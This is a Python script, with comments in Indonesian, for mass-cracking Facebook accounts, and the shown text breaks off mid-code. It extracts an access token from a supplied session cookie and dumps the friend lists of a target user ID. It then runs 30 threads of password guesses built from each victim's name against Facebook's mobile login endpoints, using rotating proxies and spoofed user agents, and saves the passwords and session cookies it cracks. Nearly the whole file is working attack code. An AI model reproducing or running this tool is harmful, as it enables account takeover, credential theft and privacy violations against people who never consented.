###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform,rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from time import time as TimeTegar
from rich.tree import Tree
from rich.table import Table as me
from rich import print as prints
from rich.markdown import Markdown as mark
from rich.console import Console
from rich.columns import Columns
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
hp = platform.platform()

###----------[ GLOBAL NAMA ]----------###
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
akunyeh = []
akun = []
usragent = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
pwpluss,pwnya=[],[]
ualu,ualuh = [],[]

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
ugen1 = []
for t in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(43,120)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","10B350","11A4449d","10B329","7B500","11B554a","13E233","13F69","13E238","9B206","9A334","11B651","11D167","8C148","8K2","7B314","10a523","8C148","8J2","1A543","12A405","8L1","8F190","8C148","8G4","8A293","8B117","19G82","15E148","18F72","20G75"])
	opera = random.choice(["SAMSUNG-GT-C3590","SAMSUNG-GT-C3312","SAMSUNG-GT-E2202","SAMSUNG-GT-S3802","SAMSUNG-GT-C3262","SAMSUNG-GT-E1282T","SAMSUNG-GT-E2252"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Opera/9.80 (J2ME/MIDP; Opera Mini/{a}.{d}/{z}.{e}; U; {i}) Presto/2.12.423 Version/12.16'
	#zax4=f'{opera} Opera/9.80 (J2ME/MIDP; Opera Mini/{a}.{d}/{z}.{e}; U; {i}) Presto/2.12.423 Version/12.16'
	zax5=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax6 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax7=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	main_ua = random.choice([zax1,zax2,zax5,zax6,zax3,zax7])
	ugen1.append(main_ua)
	
###----------[ PEWARNA ]----------###
M = '\033[1;31m' # MERAH
K = '\033[1;33m' # KUNING
H = '\033[1;32m' # HIJAU
B = '\033[1;34m' # BIRU TUA
U = '\033[1;35m' # UNGGU
P = '\033[1;37m' # PUTIH
O = '\033[1;36m' # BIRU MUDA
A = '\x1b[1;90m'  # ABU-ABU
N = '\33[m' # WARNA MATI
        
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
afh = 'A2F-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'''
 {H}╭──╮ ZXMPL ╭─╮    {N}: Pake Seadanya
 {M}├──│╭┬╮╭──╮│││╭╮  {N}:
 {O}│──┤├│┤│││││╭╯│╰╮ {N}: {H}Jangan Di Prem,kan
 {K}╰──╯╰┴╯╰┴┴╯╰╯ ╰─╯ {N}: {P}Recode : Snifer\n {N}≠=====================================≠''')

###----------[ BAGIAN LOGIN COKIS ]----------###
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
ses = requests.Session()
def login_lagi334():
	os.system('clear')
	banner()
	print('')
	cok = input(f'{P}Masukkan cookie :{H} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {M}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n {P}Token : {H}{took}')
				exit()
	except Exception as e:
		print(e)
###----------[ BAGIAN MENU ]----------###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(1)
		login_lagi334()
	os.system('clear')
	banner()
	print(f' {N}[{O}*{N}]{P} User Name : {K}{my_name}\n {N}[{O}*{N}]{P} Joined : {H}{tg}/{bl}/{th}')
	print(f' {N}≠=====================================≠')
	print(f' {N}[{B}1{N}]{P} Crack publik')
	print(f' {N}[{B}2{N}]{P} Result {H}ok{A}/{K}cp')
	print(f' {N}[{M}0{N}]{P} Logout {M}Cookie{N}')
	print(f' ≠=====================================≠')
	helpbas = input(f'{N} Pilih : ')
	print(f' ≠=====================================≠')
	if helpbas in ['1','01','001']:
		idt = input(f' {N}[{H}√{N}] {P}Masukan uid : {K}')
		dump(idt,"",{"cookie":cok},token)
		atur_dulu()
	elif helpbas in ['2','02','002']:
		result()
	elif helpbas in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{N} Success logout')
		exit()
	else:
		exit()

###----------[ DUMP ID PUBLIK ]----------###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r {N}[{H}√{N}] {P}Sedang dump uid : {H}{len(id)}{N} "),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

###---------- [ RESULT AKUN ] -----------###
def result():
	print(f'[!] 1. Hasil {H}OK{N} Anda ')
	print(f'[!] 2. Hasil {K}CP{N} Anda ')
	print('[!] 3. Kembali	')
	rohman_ganteng = input(f'\n[?] Pilih : ')
	if rohman_ganteng in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ({K} %s {N}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{N}{K}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ( {H}%s{N} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f' %s. %s ({H} %s {N}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[•] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{N}{H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener  ')
		back()
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'\n ≠=====================================≠')
	print(f' {N}[{P}1{N}] {M}Old    {N}[{P}2{N}] {K}New    {N}[{P}3{N}] {H}Random{N}')
	print(f' ≠=====================================≠')
	aturid = input(f'{N} Choose : ')
	print(f' ≠=====================================≠')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		

	print(f' {N}[{O}1{N}]{H} mobile     {N}[{O}2{N}]{H} validate{N}')
	print(f' ≠=====================================≠')
	metod = input(f'{N} Choose : ')
	print(f' ≠=====================================≠')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('validate')
	else:
		baz.append('metod1')
		
	pwplus=input(f' {N}[{M}*{N}]{P} Mau Nambah PW Manual ? y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'{P} PW Manual Menimal 6 Hurup\n Contoh : {M}kuntul,panjang')
		pwku=input(f'{O} Masukan PW : {H}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	print(f' {N}≠=====================================≠')
	uatambah= input(f' {N}[{M}*{N}]{P} Tambah UA Manual ? y/t : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		anjai = input(f'{P} Masukan UA : {U}')
		ualu.append(anjai)
	else:
		ualuh.append('tidak')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global prog,des
	print(f' {N}≠=====================================≠')
	print(f' {P}acun {H}ok {P}save di : {H}{okh}\n {P}acun {K}cp {P}save di : {K}{cph}{N}')
	print(f' ≠=====================================≠')
	print(f'{N}')
	awal = datetime.datetime.now()
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['bagong','sayang','jancok']
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'12')
						pwv.append(frs+'21')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'07')
				if '><v><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv,awal)
				elif 'validate' in baz:
					gas_krek.submit(crackvalidate,idf,pwv,awal)
				else:
					gas_krek.submit(metod1,idf,pwv)
		print(f'{N}')
		print(f'{H}+ {P}Akun OK  : {H}%s{N} '%(ok))
		print(f'{K}+ {P}Akun CP  : {K}%s{N} '%(cp))
		print(f'{N}')
		
###--------- [ METHODE ] ----------###
def crackvalidate(idf,pwv,awal):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][[bold green]OK[bold white]:[bold green]{ok}{M}/[bold yellow]CP[bold white]:[bold yellow]{cp}[purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ua = random.choice(ugen1)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{A}[{K}CP{A}] {K}{idf} | {pw} {M}~ {B}{tahun(idf)}{N}")
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{A}[{H}OK{A}] {H}{idf} | {pw} {M}~ {B}{tahun(idf)}{N}")
				print(f"\r{H}{kuki}{N}")
				open('OK/'+okh,'a').write(f'{idf}|{pw}|{kuki}')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###----------[ METODE ]----------###
resok = []
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][ [bold green]{ok}{mer}/[bold yellow]{cp} [purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen1)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": idf,
				"next": "https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=3618539641590455&cbt=1696752891275&e2e=%7B%22init%22%3A1696752891275%7D&ies=1&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=26963441-e2bf-496f-97bf-2c6623861aed&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22e971aba2-6f14-44d0-98d3-44be37e9c6c8%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22plim8mlau0dci6b51tc1%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.netease.partyglobal&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=bZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo&ret=login&fbapp_pres=0&logger_id=e971aba2-6f14-44d0-98d3-44be37e9c6c8&tp=unspecified",
				"flow": "login_no_pin",
				"encpass": f"#PWD_BROWSER:0:{str(TimeTegar()).split('.')[0]}:{pw}",
			}
			hider = {
				"Host": "mobile.facebook.com",
				"content-length": f"{len(str(data))}",
				"cache-control": "max-age=0",
				"viewport-width": "501",
				"sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"',
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-platform-version": "11.0.0",
				"sec-ch-ua-full-version-list": '"Not.A/Brand";v="8.0.0.0", "Chromium";v="116.0.5845.58", "Google Chrome";v="116.0.5845.58"',
				"sec-ch-prefers-color-scheme": "light",
				"upgrade-insecure-requests": "1",
				"origin": "https://mobile.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
